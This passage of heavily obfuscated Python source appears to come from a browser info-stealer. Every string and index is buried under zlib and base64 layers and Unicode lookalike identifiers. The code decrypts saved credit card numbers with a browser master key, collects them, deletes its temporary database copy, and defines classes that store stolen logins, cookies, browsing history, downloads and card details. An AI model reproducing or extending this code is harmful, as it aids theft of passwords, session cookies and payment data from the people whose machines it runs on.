𝙧𝗼𝘄[𝙞𝘯𝘵.from_bytes(𝙢𝙖𝙥(lambda O, i: 792 - (𝗶𝘯𝘵(𝗢) + 𝗶), 𝗺𝗮𝘱(__𝙞𝙢𝗽𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝗶𝘁𝗲𝘳(__𝙞𝙢𝗽𝘰𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xab\xca\xae\x00\x00\x03\xf8\x01\xac')).decode())] * 3)), 𝘳𝗮𝗻𝘨𝘦(1)), __𝗶𝘮𝘱𝘰𝙧𝘁__('base64').b64decode(__𝘪𝙢𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝘳𝗼𝙬[𝘪𝙣𝙩.from_bytes(𝘮𝙖𝗽(lambda O, i: 712 - (𝗶𝗻𝘵(𝙊) + 𝘪), 𝙢𝙖𝗽(__𝙞𝙢𝗽𝘰𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝗶𝘁𝙚𝗿(__𝗶𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xabr-\x07\x00\x03\xab\x01\x85')).decode())] * 3)), 𝙧𝘢𝘯𝙜𝘦(1)), __𝙞𝘮𝗽𝘰𝙧𝘵__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝘳𝘰𝘄[𝗶𝗻𝘁.from_bytes(𝘮𝘢𝙥(lambda O, i: 301 - (𝗶𝗻𝘁(𝘖) + 𝗶), 𝙢𝙖𝙥(__𝘪𝘮𝙥𝗼𝗿𝘁__('base64').b64decode(__𝘪𝙢𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝙞𝘵𝘦𝗿(__𝘪𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝘪𝘮𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xcd\xca6\x01\x00\x03\x80\x01W')).decode())] * 3)), 𝙧𝗮𝘯𝗴𝗲(1)), __𝗶𝗺𝙥𝙤𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝗿𝗼𝙬[𝙞𝗻𝘵.from_bytes(𝙢𝙖𝗽(lambda O, i: 640 - (𝗶𝗻𝙩(𝙊) + 𝗶), 𝘮𝘢𝘱(__𝙞𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝙞𝘁𝙚𝘳(__𝗶𝙢𝘱𝙤𝗿𝘁__('base64').b64decode(__𝙞𝗺𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xcb\xf25\x02\x00\x03F\x018')).decode())] * 3)), 𝗿𝙖𝙣𝗴𝙚(1)), __𝘪𝗺𝗽𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝘤𝗮𝙧𝘥_𝗻𝘂𝙢𝙗𝙚𝗿 = 𝘴𝙚𝙡𝙛.decrypt_password(𝘳𝘰𝘄[𝗶𝙣𝙩.from_bytes(𝘮𝘢𝙥(lambda O, i: 474 - (𝗶𝗻𝙩(𝗢) + 𝙞), 𝙢𝙖𝗽(__𝙞𝘮𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝘪𝙩𝙚𝘳(__𝘪𝘮𝘱𝙤𝗿𝘁__('base64').b64decode(__𝙞𝙢𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3sI\xae\x00\x00\x03F\x01n')).decode())] * 3)), 𝗿𝙖𝙣𝘨𝗲(1)), __𝙞𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘀𝙚𝘭𝘧.master_key)
            __𝘾𝗔𝘙𝗗𝗦__.append(𝗧𝘺𝙥𝗲𝘀.CreditCard(𝗿𝗼𝘸[𝙞𝘯𝙩.from_bytes(𝙢𝙖𝙥(lambda O, i: 905 - (𝗶𝙣𝘵(𝘖) + 𝗶), 𝗺𝙖𝘱(__𝗶𝙢𝘱𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝘪𝙩𝘦𝗿(__𝙞𝘮𝙥𝗼𝙧𝙩__('base64').b64decode(__𝗶𝙢𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝘯𝙜𝗲(0)), __𝗶𝘮𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝗼𝘸[𝘪𝗻𝘵.from_bytes(𝘮𝙖𝗽(lambda O, i: 668 - (𝗶𝙣𝘁(𝙊) + 𝗶), 𝗺𝙖𝙥(__𝗶𝗺𝙥𝙤𝘳𝙩__('base64').b64decode(__𝘪𝙢𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝘪𝙩𝙚𝙧(__𝘪𝘮𝙥𝙤𝘳𝙩__('base64').b64decode(__𝗶𝙢𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xcb\x8a4\x06\x00\x03_\x01E')).decode())] * 3)), 𝘳𝗮𝗻𝘨𝘦(1)), __𝙞𝗺𝙥𝘰𝗿𝘵__('base64').b64decode(__𝗶𝗺𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝗼𝘄[𝙞𝗻𝘁.from_bytes(𝗺𝙖𝘱(lambda O, i: 637 - (𝗶𝗻𝘁(𝗢) + 𝗶), 𝘮𝙖𝗽(__𝙞𝘮𝙥𝘰𝘳𝙩__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝗶𝙩𝗲𝙧(__𝙞𝗺𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xcb\xf25\x04\x00\x03E\x017')).decode())] * 3)), 𝙧𝘢𝘯𝙜𝗲(1)), __𝙞𝗺𝙥𝗼𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘤𝗮𝗿𝙙_𝗻𝘂𝗺𝘣𝗲𝘳, 𝙧𝘰𝙬[𝙞𝗻𝘁.from_bytes(𝙢𝘢𝙥(lambda O, i: 394 - (𝗶𝙣𝘁(𝗢) + 𝙞), 𝗺𝗮𝙥(__𝘪𝗺𝗽𝗼𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝙞𝘁𝙚𝙧(__𝙞𝘮𝙥𝗼𝗿𝙩__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xad\xca.\x07\x00\x03\xf3\x01\xaa')).decode())] * 3)), 𝗿𝗮𝙣𝗴𝘦(1)), __𝙞𝘮𝘱𝗼𝘳𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝙘𝙪𝘳𝘀𝘰𝘳.close()
        𝙘𝗼𝘯𝗻.close()
        𝘰𝘴.remove(__𝘪𝙢𝘱𝘰𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())

class Types:

    class Login:

        def __init__(self, url, username, password):
            𝘴𝘦𝘁𝙖𝙩𝘁𝙧(𝙨𝘦𝙡𝘧, 'url', 𝙪𝗿𝙡)
            𝙨𝗲𝙩𝘢𝘵𝘁𝘳(𝙨𝗲𝙡𝗳, 'username', 𝙪𝘀𝙚𝙧𝘯𝘢𝘮𝘦)
            𝘴𝗲𝙩𝘢𝙩𝘁𝙧(𝘀𝘦𝙡𝗳, 'password', 𝘱𝙖𝘀𝘴𝘄𝗼𝘳𝘥)

        def __str__(self):
            return __𝘪𝙢𝘱𝙤𝙧𝙩__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xdaK56\xf0J\x85`[\x00\x15\\\x03*')).decode().format(𝙨𝗲𝗹𝗳.url, 𝘀𝙚𝙡𝗳.username, 𝘀𝙚𝙡𝙛.password)

        def __repr__(self):
            return 𝙨𝙚𝗹𝘧.__str__()

    class Cookie:

        def __init__(self, host, name, path, value, expires):
            𝘀𝙚𝘵𝙖𝙩𝘁𝗿(𝘴𝘦𝗹𝗳, 'host', 𝙝𝗼𝙨𝘵)
            𝘀𝘦𝘵𝙖𝘵𝙩𝗿(𝘀𝙚𝘭𝗳, 'name', 𝗻𝗮𝗺𝙚)
            𝘀𝗲𝘵𝙖𝘁𝙩𝘳(𝘴𝗲𝘭𝙛, 'path', 𝗽𝘢𝘵𝗵)
            𝘀𝙚𝘵𝗮𝘁𝘁𝗿(𝘀𝘦𝘭𝘧, 'value', 𝘷𝗮𝘭𝙪𝙚)
            𝙨𝙚𝙩𝗮𝘁𝙩𝗿(𝘀𝗲𝗹𝙛, 'expires', 𝘦𝙭𝘱𝗶𝙧𝗲𝙨)

        def __str__(self):
            return __𝘪𝗺𝙥𝙤𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK56\xf0J\xc5\x8em\x01m\xd8\x07r')).decode().format(𝙨𝙚𝘭𝘧.host, __𝗶𝙢𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x0b\xcav\xf3\r5\x08\xb5\x05\x00\x0bu\x02h')).decode() if 𝘴𝙚𝘭𝘧.expires == 𝗶𝙣𝘵.from_bytes(𝘮𝗮𝗽(lambda O, i: 342 - (𝘪𝙣𝙩(𝘖) + 𝙞), 𝙢𝘢𝗽(__𝙞𝗺𝘱𝙤𝘳𝙩__('base64').b64decode(__𝙞𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝗶𝘁𝘦𝙧(__𝙞𝙢𝙥𝗼𝗿𝘵__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝙖𝘯𝙜𝙚(0)), __𝘪𝙢𝙥𝙤𝗿𝘁__('base64').b64decode(__𝗶𝗺𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False) else __𝗶𝙢𝙥𝗼𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x0bs\xf3\n\x0b\n\xb4\xb5\x05\x00\n\xfe\x02Z')).decode(), 𝘴𝗲𝙡𝘧.path, __𝘪𝘮𝙥𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x0b\xcav\xf3\r5\x08\xb5\x05\x00\x0bu\x02h')).decode() if 𝙨𝘦𝘭𝙛.host.startswith(__𝙞𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝙞𝗺𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode()) else __𝙞𝙢𝘱𝘰𝙧𝘁__('base64').b64decode(__𝘪𝙢𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0bs\xf3\n\x0b\n\xb4\xb5\x05\x00\n\xfe\x02Z')).decode(), 𝘴𝘦𝙡𝘧.expires, 𝘴𝙚𝗹𝘧.name, 𝙨𝘦𝗹𝙛.value)

        def __repr__(self):
            return 𝘴𝘦𝙡𝗳.__str__()

    class WebHistory:

        def __init__(self, url, title, timestamp):
            𝙨𝗲𝘁𝗮𝘵𝘁𝗿(𝘀𝗲𝘭𝗳, 'url', 𝘶𝗿𝙡)
            𝙨𝘦𝘁𝙖𝘁𝘁𝙧(𝘴𝗲𝗹𝙛, 'title', 𝘁𝙞𝘵𝗹𝗲)
            𝘴𝗲𝙩𝘢𝘁𝙩𝙧(𝘴𝙚𝘭𝗳, 'timestamp', 𝘁𝗶𝗺𝘦𝘴𝘵𝙖𝗺𝗽)

        def __str__(self):
            return __𝗶𝘮𝙥𝘰𝘳𝘵__('base64').b64decode(__𝗶𝙢𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK56\xf0J\x85`[\x00\x15\\\x03*')).decode().format(𝘀𝙚𝗹𝙛.url, 𝘴𝘦𝙡𝙛.title, 𝘴𝘦𝗹𝘧.timestamp)

        def __repr__(self):
            return 𝙨𝙚𝙡𝗳.__str__()

    class Download:

        def __init__(self, tab_url, target_path):
            𝘀𝘦𝘁𝙖𝙩𝘁𝗿(𝘴𝘦𝗹𝘧, 'tab_url', 𝘵𝗮𝘣_𝘶𝘳𝘭)
            𝘀𝘦𝘵𝙖𝘵𝘵𝙧(𝘀𝘦𝙡𝗳, 'target_path', 𝙩𝘢𝗿𝗴𝘦𝘁_𝙥𝘢𝘵𝘩)

        def __str__(self):
            return __𝗶𝗺𝙥𝗼𝗿𝙩__('base64').b64decode(__𝘪𝘮𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xdaK56\xf0J56\xb0\x05\x00\t\xf1\x02\x18')).decode().format(𝘴𝘦𝘭𝗳.tab_url, 𝙨𝘦𝙡𝙛.target_path)

        def __repr__(self):
            return 𝙨𝗲𝘭𝙛.__str__()

    class CreditCard:

        def __init__(self, name, month, year, number, date_modified):
            𝘴𝙚𝙩𝗮𝘵𝘁𝙧(𝙨𝙚𝙡𝙛, 'name', 𝙣𝘢𝘮𝘦)
            𝘴𝘦𝘁𝘢𝙩𝘁𝙧(𝙨𝘦𝗹𝙛, 'month', 𝗺𝙤𝘯𝘵𝙝)
            𝘴𝗲𝘁𝙖𝘁𝘁𝘳(𝙨𝙚𝘭𝙛, 'year', 𝘺𝗲𝗮𝗿)
            𝙨𝙚𝘁𝗮𝙩𝘁𝙧(𝘀𝗲𝘭𝗳, 'number', 𝙣𝙪𝙢𝘣𝙚𝘳)
            𝙨𝙚𝙩𝙖𝘁𝘁𝗿(𝘀𝗲𝙡𝙛, 'date_modified', 𝘥𝗮𝘁𝗲_𝙢𝘰𝙙𝗶𝘧𝙞𝗲𝘥)

        def __str__(self):
            return __𝙞𝙢𝙥𝙤𝘳𝘵__('base64').b64decode(__𝘪𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xdaK56\xf0JE\xc5\xb6\x009\n\x05N')).decode().format(𝘴𝘦𝘭𝗳.name, 𝙨𝗲𝙡𝗳.month, 𝘀𝘦𝗹𝙛.year, 𝙨𝗲𝘭𝗳.number, 𝘴𝘦𝘭𝘧.date_modified)

        def __repr__(self):
            return 𝙨𝗲𝗹𝘧.__str__()